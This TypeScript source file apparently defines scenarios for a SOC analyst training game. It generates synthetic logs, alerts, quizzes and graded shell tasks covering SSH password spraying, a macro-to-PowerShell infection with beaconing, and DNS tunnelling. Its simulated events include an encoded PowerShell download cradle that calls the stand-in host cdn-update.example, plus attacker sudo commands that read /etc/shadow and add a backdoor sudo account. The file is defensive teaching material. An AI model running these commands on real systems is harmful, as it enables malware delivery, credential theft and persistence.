/**
 * The shifts. Each one is a stretch of a working day at Fernco with harmless background traffic, a few incidents
 * hidden in it, the alerts the SIEM raises, and analyst tasks for the terminal and the SIEM. Some alerts are real
 * attacks, some are authorised activity, some are the detection getting it wrong: telling them apart is the job.
 */

import { Ev, at, auth, dns, edr, fw, idp, proxy, web, win } from './events';
import { Rng, int } from './env';
import { Shift } from './model';
import { sha256 } from './text';
import { NET_SHIFT } from './shift-net';

// ── Shift 1: exposed SSH on the web server ────────────────────────────────

const BRUTE_NAMES = ['root', 'admin', 'test', 'user', 'ubuntu', 'oracle', 'postgres', 'guest', 'ftp', 'pi', 'git', 'support',
  'mysql', 'backup', 'dev', 'info', 'webmaster', 'operator', 'demo', 'temp', 'sysadmin', 'office', 'sales', 'service'];

const SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 161, 389, 443, 445, 465, 587, 631, 993, 995, 1080, 1433, 1521, 1723, 2049,
  2375, 3000, 3306, 3389, 4443, 5000, 5432, 5601, 5900, 5985, 6379, 6443, 7001, 8000, 8008, 8080, 8081, 8443, 8888, 9000, 9090, 9200, 9300,
  10000, 11211, 15672, 27017, 50000, 50070, 60000, 61616];

const SCAN_PATHS: [string, number][] = [
  ['/', 200], ['/robots.txt', 200], ['/admin', 404], ['/admin/login', 404], ['/.git/config', 404], ['/.env', 404], ['/backup.zip', 404],
  ['/server-status', 403], ['/phpinfo.php', 404], ['/wp-login.php', 404], ['/login', 200], ['/static/app.js', 200], ['/api/v1/health', 404],
  ['/config.json', 404], ['/.DS_Store', 404], ['/db.sql', 404], ['/test', 404], ['/old', 404], ['/cgi-bin/', 403], ['/crossdomain.xml', 404],
];

const SSH_SHIFT: Shift = {
  id: 'ssh',
  number: 1,
  title: 'First morning: the web server',
  tagline: 'An SSH server open to the internet, a vulnerability scan and a quiet password spray.',
  start: at('08:00'),
  end: at('10:00'),
  skills: ['ls, cat, head, tail', 'grep and counting', 'awk, sort, uniq -c', 'SIEM stats', 'your first script'],
  brief: [
    'Welcome to the Fernco SOC. You are on the 08:00 to 10:00 shift, watching the public web shop server web01. Its SSH port is open to the internet so the build server can deploy (a known risk, RISK-77), which makes its sign-in log busy.',
    'Alerts arrive in the queue on the left as the clock runs. For each one, investigate in the SIEM and the terminal, then fill in the ticket: your verdict, the response, and the evidence. The tasks tab has terminal and SIEM exercises; they tick themselves off when your output is right.',
    'Start in the terminal: try ls /var/log, then head /var/log/auth.log. Company notes are in ~/docs. Type help for the commands, man grep for one command.',
  ],
  sources: ['auth', 'web', 'fw'],
  busy: 1,
  seed: 101,
  incidents(r: Rng): Ev[] {
    const out: Ev[] = [];
    // A: a noisy brute force from one internet address.
    let t = at('08:04:10');
    let port = 41022;
    for (let i = 0; i < 400; i++) {
      const name = BRUTE_NAMES[i % BRUTE_NAMES.length];
      if (i % 4 === 0) {
        port += int(r, 1, 9);
        out.push(fw(t, 'allow', '203.0.113.50', port, '192.0.2.10', 22, int(r, 2400, 4200)));
      }
      out.push(...auth.failed(t, name, '203.0.113.50', port, name !== 'root'));
      t += 2 + (r() < 0.1 ? 1 : 0);
    }
    // B: the weekly vulnerability scan, from IT Security's scanner.
    t = at('08:45:05');
    for (const p of SCAN_PORTS) {
      out.push(fw(t, [22, 80, 443].includes(p) ? 'allow' : 'deny', '10.0.9.5', int(r, 40000, 60000), '10.0.2.10', p, [22, 80, 443].includes(p) ? int(r, 300, 900) : 0));
      t += int(r, 2, 6);
    }
    t = at('08:52:00');
    for (let round = 0; round < 3; round++) {
      for (const [path, status] of SCAN_PATHS) {
        out.push(web(t, '10.0.9.5', 'GET', path, status, status === 200 ? int(r, 120, 9000) : 512, 'VulnScanner/4.2 (authorized scan; Fernco IT Security)'));
        t += int(r, 3, 9);
      }
    }
    // C: a slow password spray that the brute-force rule never sees, ending in a real sign-in.
    const spray = ['admin', 'deploy', 's.ito', 'backup', 'p.harris', 'l.moreau', 'deploy', 'admin', 's.ito', 'p.harris', 'backup', 'l.moreau', 'admin', 's.ito'];
    t = at('08:31:05');
    for (const name of spray) {
      out.push(...auth.failed(t, name, '198.51.100.23', int(r, 33000, 61000), name === 'admin' || name === 'backup'));
      t += int(r, 170, 215);
    }
    t = at('09:22:15');
    out.push(...auth.accepted(t, 'deploy', '198.51.100.23', 40122, 'password'));
    out.push(fw(t - 1, 'allow', '198.51.100.23', 40122, '192.0.2.10', 22, 48210));
    out.push(auth.sudo(at('09:23:02'), 'deploy', '/usr/bin/id'));
    out.push(auth.sudo(at('09:23:40'), 'deploy', '/usr/bin/cat /etc/shadow'));
    out.push(auth.sudo(at('09:24:05'), 'deploy', '/usr/sbin/useradd -m -s /bin/bash support2'));
    out.push(auth.sudo(at('09:24:31'), 'deploy', '/usr/bin/passwd support2'));
    out.push(auth.sudo(at('09:25:10'), 'deploy', '/usr/sbin/usermod -aG sudo support2'));
    out.push(auth.closed(at('09:26:44'), 'deploy'));
    out.push(...auth.accepted(at('09:27:30'), 'support2', '198.51.100.23', 40388, 'password'));
    out.push(auth.closed(at('09:28:02'), 'support2'));
    return out;
  },
  alerts: [
    {
      id: 'ssh-brute', t: at('08:20'), rule: 'SSH brute force: 20 or more failed sign-ins from one source in 5 minutes', severity: 'high', host: 'web01',
      summary: 'One internet address has failed to sign in to web01 over SSH hundreds of times.',
      entities: [['src', '203.0.113.50'], ['dest', 'web01 (192.0.2.10:22)']],
      query: 'source=auth src=203.0.113.50',
      verdict: 'tp', need: ['block'], fine: [],
      questions: [
        { id: 'src', ask: 'Which address is attacking?', answers: ['203.0.113.50'], hint: 'It is in the alert, and at the top of: source=auth action=failed | stats count by src | sort -count' },
        { id: 'names', ask: 'How many different usernames did it try?', answers: ['24'], hint: 'source=auth src=203.0.113.50 action=failed | stats dc(user), or in the terminal: grep, awk the username, sort -u, wc -l' },
        { id: 'success', ask: 'Did any of its attempts succeed? (yes or no)', answers: ['no', 'n'], hint: 'Search for action=accepted from the same address.' },
      ],
      why: 'A classic brute force: 400 password guesses in about 14 minutes, cycling through 24 common usernames, all failing. It is malicious (true positive), but nothing got in, so blocking the address is the proportionate response. Threat intel already lists it for SSH scanning. The longer-term fix is RISK-77: SSH should not be open to the whole internet, or should accept keys only.',
      actionWhy: {
        isolate: 'web01 was not compromised: every attempt failed. Taking the web shop offline would hurt the business for no gain.',
        disable: 'No account was compromised, and most of the names tried do not even exist on web01.',
        reset: 'No password was guessed, so there is nothing to reset.',
        escalate: 'Nothing got in; blocking the source is enough. Incident response is for confirmed compromises.',
        tune: 'The rule did exactly its job here.',
        close: 'This is a real attack. Closing it without blocking leaves the attacker free to keep guessing.',
      },
    },
    {
      id: 'ssh-scan', t: at('09:06'), rule: 'Port scan: one source probed 50 or more ports on one host in 10 minutes', severity: 'medium', host: 'web01',
      summary: 'An internal address connected to many ports on web01, then requested many unusual web pages.',
      entities: [['src', '10.0.9.5'], ['dest', 'web01 (10.0.2.10)']],
      query: 'src=10.0.9.5',
      verdict: 'benign', need: ['close'], fine: ['tune'],
      questions: [
        { id: 'host', ask: 'Which machine is 10.0.9.5? (its hostname)', answers: ['scanner01'], hint: 'Company notes: grep 10.0.9.5 ~/docs/assets.csv' },
        { id: 'chg', ask: 'Which change ticket authorises this activity?', answers: ['CHG-412', 'chg412'], hint: 'cat ~/docs/change-calendar.txt' },
      ],
      why: 'This is scanner01, IT Security\'s vulnerability scanner, running its weekly authorised scan of web01 under CHG-412 (08:45 to 09:30). The probing is real, so the alert is not false, but it is expected and approved: a benign true positive. Close it. Asking for the rule to skip scanner01 during approved windows would cut the noise, though attackers sometimes hide behind scan windows, so tune carefully.',
      actionWhy: {
        block: 'Blocking the company\'s own scanner would stop IT Security finding vulnerabilities, and would break the approved change.',
        isolate: 'Nothing is compromised: this is approved testing.',
        disable: 'No account is involved.',
        reset: 'No account is involved.',
        escalate: 'Incident response is for real incidents; a ticketed scan is not one. Check the change calendar first.',
      },
    },
    {
      id: 'ssh-spray', t: at('09:30'), rule: 'Successful SSH sign-in from a source with earlier failed sign-ins', severity: 'critical', host: 'web01',
      summary: 'An internet address that failed to sign in earlier has now signed in successfully.',
      entities: [['src', '198.51.100.23'], ['user', 'deploy'], ['dest', 'web01']],
      query: 'source=auth src=198.51.100.23',
      verdict: 'tp', need: ['disable', 'block', 'escalate'], fine: ['isolate', 'reset'],
      questions: [
        { id: 'acct', ask: 'Which account did the attacker sign in with?', answers: ['deploy'], hint: 'source=auth src=198.51.100.23 action=accepted' },
        { id: 'created', ask: 'What account did they create?', answers: ['support2'], hint: 'Look at the sudo commands after the sign-in: grep COMMAND= /var/log/auth.log' },
        { id: 'group', ask: 'Which group did they add it to?', answers: ['sudo'], hint: 'The usermod -aG command names the group.' },
      ],
      why: 'A password spray: one guess every three minutes or so, spread over six usernames, so the brute-force rule (20 in 5 minutes) never fired. At 09:22 the guess for deploy worked. deploy normally signs in only from the build server 10.0.5.20 with an SSH key, never with a password from the internet. The attacker then used sudo to read /etc/shadow, created support2, gave it sudo rights and tested it: persistence. This is a confirmed compromise: disable deploy and support2, block the address, and escalate so incident response can examine web01 (isolating it is reasonable too).',
      actionWhy: {
        close: 'An attacker has root on the web server. This is the most serious alert of the shift.',
        tune: 'The alert worked. The gap is that the brute-force rule missed the slow spray; a rule that counts failures per source over hours would catch it.',
      },
    },
  ],
  tasks: [
    { id: 's1-ls', after: at('08:00'), where: 'terminal', ask: 'List the log files in /var/log.', hint: 'ls takes a folder name.', ref: 'ls /var/log', compare: 'tokens',
      learn: 'Each file is one log source. auth.log is sign-ins on web01, access.log its web requests, firewall.log the edge firewall.' },
    { id: 's1-tail', after: at('08:00'), where: 'terminal', ask: 'Show the last 5 lines of /var/log/auth.log.', hint: 'tail shows the end of a file; -n says how many lines.', ref: 'tail -n 5 /var/log/auth.log', compare: 'exact',
      learn: 'tail -n 5 file. Logs grow at the bottom, so tail shows the newest events. tail -f keeps following the file as lines arrive; Ctrl+C stops it.' },
    { id: 's1-asset', after: at('08:00'), where: 'terminal', ask: 'Find the lines in ~/docs/assets.csv that mention web01.', hint: 'grep PATTERN FILE prints matching lines.', ref: 'grep web01 ~/docs/assets.csv', compare: 'exact',
      learn: 'grep web01 ~/docs/assets.csv. Knowing what a machine is for is half of triage: the asset list says web01 is public and has SSH open on purpose.' },
    { id: 's1-count', after: at('08:20'), where: 'terminal', ask: 'Count the failed password attempts in auth.log.', hint: 'Every failure line contains "Failed password". grep -c counts matching lines.', ref: 'grep -c "Failed password" /var/log/auth.log', compare: 'exact',
      learn: 'grep -c "Failed password" /var/log/auth.log (or grep ... | wc -l). Quote patterns with spaces. Note that "Invalid user" lines are a second line for the same attempt, so counting those as well would double count.' },
    { id: 's1-top', after: at('08:20'), where: 'terminal', ask: 'List each address with failed passwords and how many failures it had, most first.', hint: 'The address is the 4th field from the end: awk \'{print $(NF-3)}\'. Then sort | uniq -c | sort -rn.',
      ref: 'grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -rn', compare: 'ranked',
      learn: 'grep "Failed password" /var/log/auth.log | awk \'{print $(NF-3)}\' | sort | uniq -c | sort -rn. The pipeline every analyst knows by heart: pick a field, sort, count, sort by count. $(NF-3) counts from the end, because "invalid user" lines have two extra words.' },
    { id: 's1-names', after: at('08:20'), where: 'terminal', ask: 'Print each username that 203.0.113.50 tried, once each.', hint: 'Filter on the address, then the username is the 6th field from the end. sort -u removes repeats.',
      ref: 'grep "Failed password" /var/log/auth.log | grep "from 203.0.113.50 " | awk \'{print $(NF-5)}\' | sort -u', compare: 'set',
      learn: 'grep "Failed password" ... | grep "from 203.0.113.50 " | awk \'{print $(NF-5)}\' | sort -u. Add | wc -l to count them. Including "from " and a trailing space stops 203.0.113.5 matching 203.0.113.50.' },
    { id: 's1-siem', after: at('08:20'), where: 'siem', ask: 'In the SIEM, count failed SSH sign-ins per source address, most first.', hint: 'source=auth action=failed, then | stats count by src, then | sort -count.',
      ref: 'source=auth action=failed | stats count by src | sort -count', compare: 'set', orderBy: 'count',
      learn: 'source=auth action=failed | stats count by src | sort -count. The SIEM did the parsing for you: src, user and action are fields, so no awk needed. Same answer as the terminal pipeline.' },
    { id: 's1-script', after: at('08:20'), where: 'terminal', ask: 'Write a script ~/bin/fails.sh that prints just the number of failed passwords from the address given as its first argument. bash ~/bin/fails.sh 203.0.113.50 should print 400.',
      hint: 'nano ~/bin/fails.sh opens the editor. Inside, $1 is the first argument: grep "Failed password" /var/log/auth.log | grep -c "from $1 "',
      ref: 'grep "Failed password" /var/log/auth.log | grep -c "from $1 "', compare: 'exact', script: { path: '/home/analyst/bin/fails.sh', tests: [['203.0.113.50'], ['198.51.100.23'], ['10.0.4.110']] },
      learn: 'grep "Failed password" /var/log/auth.log | grep -c "from $1 ". Put "$1" in double quotes so the shell fills it in. chmod +x ~/bin/fails.sh lets you run it as fails.sh 203.0.113.50 from anywhere, because ~/bin is on your PATH.' },
    { id: 's1-404', after: at('09:06'), where: 'terminal', ask: 'Show the web requests from 10.0.9.5 that got a 404 (not found) response.', hint: 'In access.log the client address is field 1 and the status code is field 9: awk \'$1 == "10.0.9.5" && $9 == 404\'',
      ref: 'awk \'$1 == "10.0.9.5" && $9 == 404\' /var/log/access.log', compare: 'exact',
      learn: 'awk \'$1 == "10.0.9.5" && $9 == 404\' /var/log/access.log. Lots of 404s for admin pages, .git and backups is what any scanner looks like, friendly or not: the context (scanner01, CHG-412) decides.' },
    { id: 's1-sudo', after: at('09:30'), where: 'terminal', ask: 'Show the full log lines of every command run with sudo on web01.', hint: 'sudo lines contain COMMAND=', ref: 'grep "COMMAND=" /var/log/auth.log', compare: 'exact',
      learn: 'grep COMMAND= /var/log/auth.log. Among the routine nginx reloads, the deploy account reads /etc/shadow, creates support2 and adds it to sudo: an attacker setting up persistence.' },
  ],
  intel: {
    '203.0.113.50': '203.0.113.50\n  Reputation: MALICIOUS (score 92/100)\n  Categories: SSH brute force, scanning\n  Reported by 340 sensors in the last 7 days. First seen 2026-10-02.',
    '198.51.100.23': '198.51.100.23\n  Reputation: suspicious (score 61/100)\n  Categories: password spraying\n  Reported by 12 sensors. First seen 2026-11-02.',
    '10.0.9.5': '10.0.9.5\n  Private address: threat intel does not cover internal addresses. See ~/docs/assets.csv.',
  },
  whois: {
    '203.0.113.50': '203.0.113.50\n  NetName: VPS-HOSTING-EX\n  Organisation: Example VPS Hosting B.V.\n  Country: NL\n  Abuse contact: abuse@vps-hosting.example',
    '198.51.100.23': '198.51.100.23\n  NetName: RESI-BROADBAND-EX\n  Organisation: Residential Broadband Example\n  Country: BR\n  Note: home internet connections, often used by proxies and infected machines',
  },
};

// ── Shift 2: phishing to beaconing ────────────────────────────────────────

/** The macro's PowerShell, encoded the way -EncodedCommand expects: base64 of UTF-16LE. */
const PS_TEXT = "IEX (New-Object Net.WebClient).DownloadString('http://cdn-update.example/s.ps1')";
export const PS_ENC = btoa([...PS_TEXT].map(ch => ch + '\0').join(''));
export const DROPPED_HASH = sha256('svchelper.exe from cdn-update.example, sample 2026-11-05');

function infection(out: Ev[], r: Rng, user: string, host: string, ip: string, t0: number, withEdr: boolean) {
  const t = (s: number) => t0 + s;
  out.push(dns(t(0), ip, 'invoices-portal.example', 'A', '192.0.2.140'));
  out.push(proxy(t(1), user, ip, 'GET', 'http://invoices-portal.example/download/inv_4471.docm', 200, 48213, 'uncategorized'));
  if (withEdr) {
    out.push(edr(t(35), host, { event: 'process_start', user, parent: 'explorer.exe', process: 'winword.exe', cmd: `winword.exe C:\\Users\\${user}\\Downloads\\inv_4471.docm` }));
    out.push(edr(t(49), host, { event: 'process_start', user, parent: 'winword.exe', process: 'powershell.exe', cmd: `powershell.exe -NoP -W Hidden -enc ${PS_ENC}` }));
  }
  out.push(dns(t(51), ip, 'cdn-update.example', 'A', '192.0.2.77'));
  out.push(proxy(t(52), user, ip, 'GET', 'http://cdn-update.example/s.ps1', 200, 9120, 'uncategorized'));
  if (withEdr) {
    const path = `C:\\Users\\${user}\\AppData\\Roaming\\upd\\svchelper.exe`;
    out.push(edr(t(60), host, { event: 'file_create', user, process: 'powershell.exe', path, sha256: DROPPED_HASH }));
    out.push(edr(t(71), host, { event: 'registry_set', user, process: 'powershell.exe', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', value: 'svchelper', data: path }));
    out.push(edr(t(82), host, { event: 'process_start', user, parent: 'powershell.exe', process: 'svchelper.exe', cmd: 'svchelper.exe' }));
  }
}

function beacon(out: Ev[], r: Rng, ip: string, from: number, to: number) {
  let t = from;
  let n = 0;
  while (t < to) {
    out.push(fw(t, 'allow', ip, int(r, 49152, 65000), '192.0.2.77', 443, int(r, 420, 560)));
    if (n % 5 === 0) out.push(dns(t - 1, ip, 'cdn-update.example', 'A', '192.0.2.77'));
    t += 60 + (r() < 0.15 ? (r() < 0.5 ? -1 : 1) : 0);
    n++;
  }
}

const PHISH_SHIFT: Shift = {
  id: 'phish',
  number: 2,
  title: 'Mid-morning: the invoice',
  tagline: 'An Office document starts PowerShell, a laptop starts calling home, and a traveller who never left.',
  start: at('09:00'),
  end: at('11:00'),
  skills: ['EDR process trees', 'base64 decoding', 'beacon intervals with awk', 'scoping: who else?', 'SIEM timechart and table'],
  brief: [
    'Second shift, 09:00 to 11:00. Today the logs come from the staff side: the web proxy, the DNS resolver, EDR on the laptops, the edge firewall and the cloud identity provider. Workstation addresses and owners are in ~/docs/staff.csv.',
    'One thing to know: EDR sensors only see the machines they are installed and working on. The network logs (DNS, proxy, firewall) see every machine.',
    'Same routine: work the alert queue, write your tickets, and use the tasks to practise. Useful today: base64 -d, intel, awk with $1 time stamps, and the SIEM\'s timechart.',
  ],
  sources: ['proxy', 'dns', 'edr', 'fw', 'idp'],
  busy: 1,
  seed: 202,
  edrSilent: ['LT-122'],
  incidents(r: Rng): Ev[] {
    const out: Ev[] = [];
    infection(out, r, 't.ward', 'LT-114', '10.0.4.114', at('09:02:30'), true);
    beacon(out, r, '10.0.4.114', at('09:05:00'), at('11:00'));
    infection(out, r, 'd.kim', 'LT-122', '10.0.4.122', at('09:40:10'), false);
    beacon(out, r, '10.0.4.122', at('09:43:00'), at('11:00'));
    // m.lee: in the office, then on the VPN from the same laptop.
    out.push(idp(at('09:48:10'), { user: 'm.lee', src: '192.0.2.5', geo: 'Lisbon, PT', device: 'LT-118', mfa: 'approved', result: 'success' }));
    out.push(idp(at('10:05:40'), { user: 'm.lee', src: '192.0.2.6', geo: 'Frankfurt, DE', device: 'LT-118', mfa: 'approved', result: 'success' }));
    return out;
  },
  alerts: [
    {
      id: 'phish-ps', t: at('09:04'), rule: 'Office application started PowerShell with an encoded command', severity: 'high', host: 'LT-114',
      summary: 'Word on LT-114 launched a hidden PowerShell with a base64-encoded command.',
      entities: [['host', 'LT-114'], ['user', 't.ward'], ['parent', 'winword.exe'], ['process', 'powershell.exe']],
      query: 'source=edr host=LT-114',
      verdict: 'tp', need: ['isolate', 'escalate'], fine: ['reset', 'block'],
      questions: [
        { id: 'doc', ask: 'What is the name of the document t.ward opened?', answers: ['inv_4471.docm'], hint: 'The winword.exe process_start shows the file. Or the proxy log: what did t.ward download just before?' },
        { id: 'domain', ask: 'Which domain did the PowerShell download its script from?', answers: ['cdn-update.example'], hint: 'Decode the -enc value: echo <the value> | base64 -d' },
        { id: 'persist', ask: 'What is the name of the registry Run value it created to survive a reboot?', answers: ['svchelper'], hint: 'source=edr host=LT-114 event=registry_set' },
      ],
      why: 'Phishing to malware, step by step: t.ward downloaded inv_4471.docm from a two-day-old domain, Word ran its macro, the macro started hidden PowerShell, which downloaded a script from cdn-update.example, dropped svchelper.exe, added a Run key so it starts at every sign-in, and launched it. The hash is known malware. Isolate LT-114 and escalate; blocking the domains and resetting t.ward\'s password are sensible extras.',
      actionWhy: {
        close: 'Word starting hidden, encoded PowerShell is almost never legitimate, and here it led to malware.',
        tune: 'The rule caught a real infection.',
        disable: 'Disabling t.ward\'s account does not stop malware already running on the laptop; isolation does. A password reset is the right account action.',
      },
    },
    {
      id: 'phish-beacon', t: at('09:50'), rule: 'Periodic outbound connections to one external address (possible command and control)', severity: 'high', host: 'LT-114',
      summary: 'LT-114 has connected to the same external address at very regular intervals for 45 minutes.',
      entities: [['src', '10.0.4.114 (LT-114)'], ['dst', '192.0.2.77:443']],
      query: 'source=fw dst=192.0.2.77',
      verdict: 'tp', need: ['block', 'isolate'], fine: ['escalate', 'reset'],
      questions: [
        { id: 'gap', ask: 'About how many seconds pass between connections?', answers: ['60', '59', '61', '1 minute', 'one minute', '60s', '60 seconds', '1 min'], hint: 'source=fw src=10.0.4.114 dst=192.0.2.77 | timechart span=1m count, or compute the gaps with awk.' },
        { id: 'other', ask: 'Which other laptop is calling the same address? (name or IP)', answers: ['LT-122', '10.0.4.122', 'lt122'], hint: 'source=fw dst=192.0.2.77 | stats count by src' },
      ],
      why: 'Malware "beacons": it checks in with its command-and-control server on a timer, here every 60 seconds, with small, similar-sized requests. People do not browse like a metronome. The key finding is scope: LT-122 (d.kim) beacons to the same address. d.kim downloaded the same invoice at 09:40, but LT-122\'s EDR sensor is not reporting, so only the network logs saw it. Block 192.0.2.77 and cdn-update.example, and isolate both laptops.',
      actionWhy: {
        close: 'Regular connections to a known command-and-control server: this is an active infection.',
        tune: 'The rule found an infection EDR missed on LT-122.',
        disable: 'The malware does not need the user\'s account to beacon; blocking and isolating stop it.',
      },
    },
    {
      id: 'phish-travel', t: at('10:06'), rule: 'Impossible travel: sign-ins from two countries too far apart for the time between them', severity: 'medium', host: 'idp',
      summary: 'm.lee signed in from Lisbon and then from Frankfurt, about 1,800 km apart, 17 minutes later.',
      entities: [['user', 'm.lee'], ['first', '09:48 192.0.2.5 Lisbon, PT'], ['second', '10:05 192.0.2.6 Frankfurt, DE']],
      query: 'source=idp user=m.lee',
      verdict: 'fp', need: ['close', 'tune'], fine: [],
      questions: [
        { id: 'dev', ask: 'Which device did both sign-ins come from?', answers: ['LT-118', 'lt118'], hint: 'source=idp user=m.lee | table _time src geo device' },
        { id: 'what', ask: 'What is 192.0.2.6?', answers: ['vpn'], contains: true, hint: 'grep 192.0.2.6 ~/docs/assets.csv, or whois 192.0.2.6' },
      ],
      why: 'Both sign-ins came from m.lee\'s own laptop LT-118 with MFA approved. 192.0.2.6 is Fernco\'s own VPN gateway, hosted in Frankfurt: when m.lee connected to the VPN, her traffic started leaving from there. Many remote staff sign in through it every day. Nobody travelled; the detection is wrong (false positive). Close it and ask for the VPN egress address to be treated as Lisbon by the rule.',
      actionWhy: {
        disable: 'm.lee did nothing wrong; disabling her account would stop her working.',
        reset: 'Nothing suggests her password is known to anyone else.',
        block: 'Blocking 192.0.2.6 would cut off everyone who works over the VPN.',
        isolate: 'LT-118 shows no sign of compromise.',
        escalate: 'There is no incident: the location data was misleading.',
      },
    },
  ],
  tasks: [
    { id: 's2-decode', after: at('09:04'), where: 'terminal', ask: 'Pull the encoded PowerShell command out of the EDR log and decode it.', hint: 'grep powershell /var/log/edr.log shows the -enc value. Copy it, then: echo <value> | base64 -d',
      ref: `echo ${PS_ENC} | base64 -d`, compare: 'contains', needle: 'DownloadString',
      learn: 'grep -o "enc [A-Za-z0-9+/=]*" /var/log/edr.log | head -1 | cut -d" " -f2 | base64 -d. PowerShell\'s -EncodedCommand is base64 of UTF-16LE text. Attackers encode to hide the command from casual reading, not from you.' },
    { id: 's2-hash', after: at('09:04'), where: 'terminal', ask: 'Find the SHA-256 hash of the file PowerShell dropped on LT-114 and look it up with intel.', hint: 'grep file_create /var/log/edr.log, then: intel <the hash>',
      ref: `intel ${DROPPED_HASH}`, compare: 'contains', needle: 'QuietLoader',
      learn: 'Hashes are exact fingerprints: if the hash matches known malware, the file is that malware, whatever its name. svchelper.exe is a name chosen to look like a Windows component.' },
    { id: 's2-count', after: at('09:50'), where: 'terminal', ask: 'Count LT-114\'s connections to 192.0.2.77 in the firewall log.', hint: 'Two greps: one for "src=10.0.4.114 " and one with -c for "dst=192.0.2.77 ". The trailing spaces stop partial matches.',
      ref: 'grep "src=10.0.4.114 " /var/log/firewall.log | grep -c "dst=192.0.2.77 "', compare: 'exact',
      learn: 'grep "src=10.0.4.114 " /var/log/firewall.log | grep -c "dst=192.0.2.77 ". About one per minute since 09:05.' },
    { id: 's2-scope', after: at('09:50'), where: 'terminal', ask: 'List every source address that has connected to 192.0.2.77, with how many connections each, most first.', hint: 'grep for the destination, awk \'{print $5}\' is the src= field, then sort | uniq -c | sort -rn.',
      ref: 'grep "dst=192.0.2.77 " /var/log/firewall.log | awk \'{print $5}\' | sort | uniq -c | sort -rn', compare: 'ranked', kv: true,
      learn: 'grep "dst=192.0.2.77 " /var/log/firewall.log | awk \'{print $5}\' | sort | uniq -c | sort -rn. Always scope: once you know a bad address, ask who else talked to it. Here LT-122 appears, with no EDR alert at all.' },
    { id: 's2-chart', after: at('09:50'), where: 'siem', ask: 'In the SIEM, chart LT-114\'s connections to 192.0.2.77 per minute.', hint: 'source=fw src=10.0.4.114 dst=192.0.2.77 | timechart span=1m count',
      ref: 'source=fw src=10.0.4.114 dst=192.0.2.77 | timechart span=1m count', compare: 'set',
      learn: 'A flat line at 1 per minute is the signature of a beacon. Human browsing comes in bursts and gaps.' },
    { id: 's2-gaps', after: at('09:50'), where: 'terminal', ask: 'Write ~/bin/gaps.sh SRC DST: it prints the number of seconds between each connection from SRC to DST and the one before, one number per line.',
      hint: 'Filter with grep "src=$1 " and grep "dst=$2 ". The time is in $1 like 2026-11-05T09:05:00Z: substr($1,12,8) gives 09:05:00; split it on ":" and work out seconds. Print s - previous when NR > 1.',
      ref: 'grep "src=$1 " /var/log/firewall.log | grep "dst=$2 " | awk \'{split(substr($1,12,8),t,":"); s=t[1]*3600+t[2]*60+t[3]; if (NR>1) print s-p; p=s}\'', compare: 'exact',
      script: { path: '/home/analyst/bin/gaps.sh', tests: [['10.0.4.114', '192.0.2.77'], ['10.0.4.122', '192.0.2.77']] },
      learn: 'awk \'{split(substr($1,12,8),t,":"); s=t[1]*3600+t[2]*60+t[3]; if (NR>1) print s-p; p=s}\'. Pipe it into sort -n | uniq -c and a beacon shows up as almost every gap being 60. Real malware adds "jitter" to look less regular; the pattern still stands out.' },
    { id: 's2-table', after: at('10:06'), where: 'siem', ask: 'In the SIEM, show every sign-in by m.lee today as a table of time, source address, location and device.', hint: 'source=idp user=m.lee | table _time src geo device',
      ref: 'source=idp user=m.lee | table _time src geo device', compare: 'set',
      learn: 'Same device, MFA approved each time, and the "Frankfurt" address is the company VPN: context turns an alarming alert into a non-event.' },
  ],
  intel: {
    'invoices-portal.example': 'invoices-portal.example\n  Reputation: suspicious (score 74/100)\n  Categories: newly registered domain, phishing\n  Registered 2026-11-03 (2 days ago).',
    'cdn-update.example': 'cdn-update.example\n  Reputation: MALICIOUS (score 97/100)\n  Categories: malware distribution, command and control (QuietLoader)\n  First seen 2026-10-30.',
    '192.0.2.77': '192.0.2.77\n  Reputation: MALICIOUS (score 95/100)\n  Categories: command and control (QuietLoader)\n  Resolves from cdn-update.example.',
    [DROPPED_HASH]: `${DROPPED_HASH}\n  Reputation: MALICIOUS\n  Family: QuietLoader (loader and remote access)\n  Detected by 51 of 70 engines. Known names: svchelper.exe, updsvc.exe`,
    '192.0.2.140': '192.0.2.140\n  Reputation: suspicious (score 70/100)\n  Categories: phishing hosting',
  },
  whois: {
    'invoices-portal.example': 'invoices-portal.example\n  Registrar: Example Registrar Ltd\n  Created: 2026-11-03\n  Registrant: privacy protected',
    'cdn-update.example': 'cdn-update.example\n  Registrar: Example Registrar Ltd\n  Created: 2026-10-29\n  Registrant: privacy protected\n  Note: not related to any real update service',
    '192.0.2.77': '192.0.2.77\n  Organisation: Example Bulletproof Hosting\n  Country: unknown (offshore)',
    '192.0.2.6': '192.0.2.6\n  Organisation: Example Cloud Provider GmbH\n  Location: Frankfurt, DE\n  Customer: Fernco Ltd (remote-access VPN gateway)',
    '192.0.2.5': '192.0.2.5\n  Organisation: Example Telecom PT\n  Location: Lisbon, PT\n  Customer: Fernco Ltd (office internet line)',
  },
};

// ── Shift 3: the night shift ──────────────────────────────────────────────

const hex = (r: Rng, n: number) => Array.from({ length: n }, () => '0123456789abcdef'[int(r, 0, 15)]).join('');

const NIGHT_SHIFT: Shift = {
  id: 'night',
  number: 3,
  title: 'Night watch',
  tagline: 'Strange DNS from a database server, a huge upload, and an administrator who should be asleep.',
  start: at('01:00'),
  end: at('03:00'),
  skills: ['DNS tunnelling', 'awk sums and lengths', 'time ranges with awk', 'Windows event IDs', 'baselines: what is normal at 2am?'],
  brief: [
    'Night shift, 01:00 to 03:00. The office is empty, so traffic is light: anything busy deserves a look. Today\'s logs: DNS, the edge firewall, Windows security events from the domain controller dc01, and EDR.',
    'Windows event IDs you will meet: 4624 sign-in, 4625 failed sign-in, 4634 sign-out, 4720 account created, 4722 account enabled, 4728 member added to a security group. Logon type 3 is a network sign-in, 10 is remote desktop.',
    'Check ~/docs/oncall.txt for who is allowed to be working tonight, and the change calendar for planned jobs.',
  ],
  sources: ['dns', 'fw', 'win', 'edr'],
  busy: 0.3,
  seed: 303,
  incidents(r: Rng): Ev[] {
    const out: Ev[] = [];
    // DNS tunnelling from db02: data hidden in query names, answered by the attacker's name server.
    let t = at('01:20:00');
    while (t < at('01:50:00')) {
      const q = `${hex(r, int(r, 30, 56))}.t.sync-check.example`;
      out.push(dns(t, '10.0.3.22', q, 'TXT', '"ok"'));
      out.push(fw(t, 'allow', '10.0.1.53', int(r, 30000, 65000), '203.0.113.9', 53, int(r, 180, 260), 'udp'));
      t += int(r, 3, 5);
    }
    // The nightly offsite backup: big, steady and planned.
